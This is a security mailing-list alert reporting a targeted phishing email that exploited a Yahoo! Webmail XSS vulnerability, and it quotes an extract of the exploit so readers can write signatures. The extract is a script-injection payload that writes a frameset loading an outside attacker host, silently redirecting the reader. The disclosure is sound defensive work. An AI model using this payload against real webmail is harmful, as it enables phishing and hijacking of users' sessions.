Subject: [Argeniss] Alert - Yahoo! Webmail XSS


Hi.

I just got a targeted phishing attack to one of my
Yahoo email accounts, what it´s insteresting it's that
the attack exploits a Yahoo! webmail 0day XSS
vulnerability. 
I'm trying to contact Yahoo right now but in the
meantime I thought it will be good to provide some
bits because the seriousness of this . 
When you browse a message on Yahoo! Webmail the XSS
exploit creates a frameset and redirects to
http://w00tynetwork.com/x/ ,it's interesting that the
address bar at IE dosn´t refresh to show the actual
URL, you can only see the redirection to
http://w00tynetwork.com/x/ on IE status bar if you
have it visible.
I don't know if this vulnerability is being exploited
on the wild since it was a targeted attack, I'm sure
about this because the content of the message.

Here is an extract from the exploit so you can start
build some signatures, filtering, etc.
-----------------------------------
(java/**/script:document.write('<frameset cols=100%
rows=100% border=0 frameboarder=0framespacing=0><frame
frameborder=0
src=http://w00tynetwork.com/x/></frameset>'))
-----------------------------------

I will provide full details later when Yahoo! fix the
issue.
If security vendors are insterested on full details
plese ask for them at info>at<argeniss>.<com

Cesar.
